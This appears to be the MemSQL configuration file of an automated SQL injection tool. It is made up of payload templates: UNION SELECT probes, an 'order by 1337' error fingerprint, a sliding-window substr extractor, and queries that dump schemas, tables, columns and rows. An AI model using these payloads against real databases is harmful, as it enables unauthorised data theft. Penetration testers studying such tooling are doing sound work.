vendor: MemSQL
# docker pull memsql/quickstart

resource:
 info: |
  concat(
      concat_ws(
          '${enclose_value_sql}',
          version(),
          database(),
          user()
      ),
      '${trail_sql}'
  )

 schema:
  database: |
   select concat(
       ifnull(
           group_concat(
               '${enclose_value_sql}',
               r,
               '${separator_qte_sql}',
               q,
               '${enclose_value_sql}'
               separator '${separator_cell_sql}'
           ),
           '${trail_sql}'
       ),
       '${trail_sql}'
   ) from (
       select
           cast(SCHEMA_NAME as char) r,
           cast(count(TABLE_NAME) as char) q
       from INFORMATION_SCHEMA.tables t
       right join INFORMATION_SCHEMA.schemata s
       on s.SCHEMA_NAME = t.table_schema
       group by r
       ${limit}
   ) x

  table: |
   select concat(
       group_concat(
           '${enclose_value_sql}',
           r,
           '${separator_qte_sql}',
           q,
           '${enclose_value_sql}'
           separator '${separator_cell_sql}'
       ),
       '${trail_sql}'
   ) from (
       select
           cast(TABLE_NAME as char) r,
           cast(ifnull(table_rows, '0') as char) q
       from information_schema.tables
       where TABLE_SCHEMA = '${database}'
       order by r
       ${limit}
   ) x

  column: |
   select concat(
       group_concat(
           '${enclose_value_sql}',
           n,
           '${separator_qte_sql}',
           0,
           '${enclose_value_sql}'
           separator '${separator_cell_sql}'
       ),
       '${trail_sql}'
   ) from (
       select cast(COLUMN_NAME as char) n
       from information_schema.columns
       where TABLE_SCHEMA = '${database}'
       and TABLE_NAME = '${table}'
       order by n
       ${limit}
   ) x

  row:
   query: |
    select concat(
        group_concat(
            '${enclose_value_sql}',
            r,
            '${separator_qte_sql}',
            q,
            '${enclose_value_sql}'
            separator '${separator_cell_sql}'
        ),
        '${trail_sql}'
    ) from (
        select
            cast(concat(${fields}) as char) r,
            cast(count(*) as char) q
        from `${database}`.`${table}`
        group by r
        ${limit}
    ) x
   fields:
    field: trim(ifnull(`${field.value}`, ''))
    concat: ",0x7f,"

strategy:
 configuration:
  slidingWindow: |
   concat(
       '${lead}',
       substr(
           (${injection}),
           ${window.char},
           ${capacity}
       )
   )
  limit: limit ${limit.value}, 65536
  failsafe: 1337${indice}7330%2b1
  calibrator: rpad('${calibrator_sql}',1024,'${calibrator_sql}')
  limitBoundary: 0
  fingerprint:
   errorMessage:
    - memsql
   orderByErrorMessage:
    - Unknown column '1337' in 'order clause'

 normal:
  indices: union select ${indices}
  capacity: |
   (
       select concat(
           '${lead}',
           ${indice},
           ${calibrator}
       )
   )
  orderBy: order by 1337